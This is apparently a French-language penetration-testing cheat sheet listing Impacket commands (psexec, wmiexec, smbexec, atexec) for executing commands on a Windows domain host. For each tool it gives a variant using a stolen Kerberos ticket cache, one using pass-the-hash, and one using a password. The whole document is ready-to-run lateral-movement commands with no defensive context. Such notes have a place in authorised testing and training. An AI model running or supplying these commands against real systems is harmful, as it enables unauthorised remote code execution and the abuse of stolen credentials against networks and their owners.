### PsExec
#### Avec un TGS

```bash
export KRB5CCNAME=truc.ccache
impacket-psexec -k -no-pass $domain/$user@$target
```

#### Avec un hash

```bash
impacket-psexec $domain/$user@$target -hashes nt:lm
```

#### Avec password

```bash
impacket-psexec $domain/$user@$target
```

---
### WmiExec

#### Avec un TGS

```bash
export KRB5CCNAME=truc.ccache
impacket-wmiexec -k -no-pass $domain/$user@$target
```

#### Avec un hash

```bash
impacket-wmiexec $domain/$user@$target -hashes nt:lm
```

#### Avec password

```bash
impacket-wmiexec $domain/$user@$target
```

---
### SmbExec

#### Avec un TGS

```bash
export KRB5CCNAME=truc.ccache
impacket-smbexec -k -no-pass $domain/$user@$target
```

#### Avec un hash

```bash
impacket-smbexec $domain/$user@$target -hashes nt:lm
```

#### Avec password

```bash
impacket-smbexec $domain/$user@$target
```

---
### AtExec

#### Avec un TGS

```bash
export KRB5CCNAME=truc.ccache
impacket-atexec -k -no-pass $domain/$user@$target $command
```

#### Avec un hash

```bash
impacket-atexec $domain/$user@$target -hashes nt:lm $command
```

#### Avec password

```bash
impacket-atexec $domain/$user@$target $command
```

